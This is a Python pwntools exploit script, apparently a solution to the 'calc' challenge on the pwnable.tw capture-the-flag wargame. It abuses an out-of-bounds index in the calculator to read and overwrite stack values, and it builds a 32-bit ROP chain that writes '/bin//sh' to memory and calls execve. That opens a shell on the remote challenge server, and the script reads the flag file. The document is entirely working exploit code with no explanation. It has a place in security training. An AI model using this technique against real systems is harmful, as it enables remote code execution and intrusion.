#!/usr/bin/env python3
from pwn import *

PORT = 10100
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./calc', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*0x80493ED
            b*0x8049411
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

p.recvuntil(b"=== Welcome to SECPROG calculator ===\n")

def to_u32(x):
    return x & 0xffffffff

def a_read(idx):
    p.sendline(f"+{idx}".encode())
    leak = int(p.recvline().strip(), 10)
    leak = to_u32(leak)
    return leak

def a_write(idx, target):
    target = to_u32(target)

    cur = a_read(idx)
    log.info(f"idx {idx}: cur={cur:#x}, target={target:#x}")

    diff = to_u32(target - cur)

    if diff == 0:
        return

    if diff <= 0x7fffffff:
        payload = f"+{idx}+{diff}".encode()
    else:
        payload = f"+{idx}-{0x100000000 - diff}".encode()

    p.sendline(payload)
    new = int(p.recvline().strip(), 10) & 0xffffffff

    log.info(f"idx {idx}: new={new:#x}")

# Exploit Overwrite into ROPchain

pop_eax = 0x805c34b
pop_edx_ecx_ebx = 0x80701d0
mov_ptr_edx_eax = 0x0809b30d
rw = 0x80eb0a0
int_0x80 = 0x8049a21

ROP = [
    # *(rw) = "/bin"
    pop_eax, u32(b"/bin"),
    pop_edx_ecx_ebx,
    rw,
    0,
    0,
    mov_ptr_edx_eax,

    # *(rw+4) = "//sh"
    pop_eax, u32(b"//sh"),
    pop_edx_ecx_ebx,
    rw + 4,
    0,
    0,
    mov_ptr_edx_eax,

    # execve(*rw)
    pop_eax, 0x0b,
    pop_edx_ecx_ebx,
    0, 0 , rw,
    int_0x80
]

eip_idx = 361

for i, gadget in enumerate(ROP):
    a_write(eip_idx + i, gadget)


p.sendline(b"d1nhdwc")
p.sendline(b"\ncat /home/calc/flag")

p.interactive()